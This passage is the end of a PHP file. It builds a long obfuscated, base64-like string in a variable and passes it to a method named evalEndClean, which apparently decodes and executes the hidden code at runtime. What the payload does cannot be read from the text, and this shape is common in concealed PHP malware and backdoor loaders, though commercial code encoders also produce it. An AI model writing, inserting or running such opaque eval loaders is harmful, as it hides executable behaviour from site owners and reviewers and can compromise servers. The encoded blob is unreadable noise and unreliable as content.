		$p.='EYTEwpe0rLcFLnl65u7QJfaO6lbaqMb8xoWNhm2XtaVdh0wtwlp86/9XJq8efrRQNnLpaMulJ2qOq4fNc+nVlktPXUvrZdPWEOjI';
		$p.='EJBJZp5yLYbppMihEPJUxLN5Apsx6keD9aE6TFx6l2GcQLG+6k5It5+oCHUSJp1/IMQC5FJwqhhzAZl6lMIHPuv+6KI7S6O2En4w';
		$p.='xtA7SyifeyrNXn2vBoMNPcjxaD1uuosaeHhHhnk6esK+Ed9gtotcY7IhG0JlCjINiHUYCzQSWgrZIp+QrQBjwoBxiknZR3L8FouB';
		$p.='lfG+B2nIq6RLmB2AF83K3RPs9lzsg+AdQwSQ6HlQXg/k9CUJnvscWM4A5fkFE1GwN/lRzs4bAHlsGp1OBPGBaax22Gkd8OzodFly';
		$p.='q7smLCW5MrYsV8d3+yro7lVwhmr/PLor214H6orPo1LvFF4EmrsUjfveb2EMXktwxDyNLhZX3nyRz7OiVT/L3oaUCpd13VZe9byC';
		$p.='BwzMRhvSwYx6eirr0MDVOKCFaRxZK4y+8OtM40JQrB+ItZhGl3EaTceTLC3KMC0LHd6F7qJY5Fo7XR1D45voXrQV/9nPKU5UfiXv';
		$p.='L4o7zkX3d6wyKjbHS+TBoYx3wlNtvKCu4EeeL/e7Z3+c87tqqkLqAnz3y3g1wLfn574OJvH4hcJfhB5eKFRc67QMtei+qYSleHQs';
		$p.='sVo6ipEbLmV/pjdpdpv6T6m8u9VtzV4Jq2o4qDCS3Rb62j/XrgWQO0r8AF5QsDsl2QmTBGBm2d8CRHc3zSHhUoLpk9qUIA401OWl';
		$p.='S4VJnwPhCNF4Ghc3Y+oWtGYulPA/HtZDXkFh0giq++mG1WWNIdoVxDm9EUzOzuwB6TVAx8yv5+MFmR9QIYQ45gfBo+VyszJKyxiz';
		$p.='UxU3kjfmtZsLD7p1QzWjKsKMoOSz+FbNwB/KFHNURNtSJ5XTjO0Ew3p9yRxilvUrevSUZnNQUtrolCLnVMP061c/IH9W0J51z58B';
		$p.='Of4AWPM0ypw3AuAeLIug4XhFaRtqsHZd8/zZ6cnzZ/8CNivZuQ==';

		classCreator::evalEndClean($p);
	}
}
?>